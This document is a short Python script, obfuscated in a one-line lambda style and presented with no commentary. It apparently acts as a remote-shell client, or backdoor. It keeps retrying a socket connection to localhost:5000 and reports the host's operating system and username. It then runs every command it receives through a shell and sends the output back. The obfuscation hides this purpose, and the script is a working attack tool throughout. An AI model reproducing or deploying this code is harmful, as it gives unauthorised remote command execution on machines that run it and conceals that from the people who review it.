(lambda __g: [[[[[(lambda __mod: [None for __g['Popen'], __g['PIPE'] in [(__mod.Popen, __mod.PIPE)]][0])(__import__('subprocess', __g, __g, ('Popen', 'PIPE'), 0)) for __g['pwd'] in [(__import__('pwd', __g, __g))]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['time'] in [(__import__('time', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])(globals())
(lambda __g: (lambda __after: [__after() for __g['op'] in [('Windows')]][0] if (os.name == 'nt') else [__after() for __g['op'] in [('Linux')]][0])(lambda: None))(globals())
(lambda __g: [[None for __g['client'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['u'] in [(pwd.getpwuid(os.getuid()).pw_name)]][0])(globals())
def con():
    while True:
        try:
            client.connect(('localhost', 5000))
            break
        except:
            time.sleep(5)
con()
(lambda __y, __contextlib, __g: [None for __g['cl'], cl.__name__ in [(lambda : (lambda __l: (client.send(((((('Client Connected!\nOS: '.encode('utf-8') + op.encode('utf-8')) + '\n'.encode('utf-8')) + 'Username: '.encode('utf-8')) + u.encode('utf-8')) + '\n'.encode('utf-8'))), (lambda __after: __y(lambda __this: lambda: (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: __this())][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and ([True for __out[0] in [(lambda after: after())]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [([[[(client.send((str(__l['re']).encode('utf-8') + '\n'.encode('utf-8'))), (lambda __after: __after()))[1] for __l['re'] in [(__l['ou'].communicate())]][0] for __l['ou'] in [(Popen([__l['c']], stdout=PIPE, shell=True))]][0] for __l['c'] in [(client.recv(1024).decode('utf-8').replace('\n', ''))]][0])]][0]})())))([None]) if True else __after())())(lambda: None))[1])({}), 'cl')]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), __import__('contextlib', level=0), globals())
(lambda __g: [(receive_thread.start(), None)[1] for __g['receive_thread'] in [(threading.Thread(target=cl))]][0])(globals())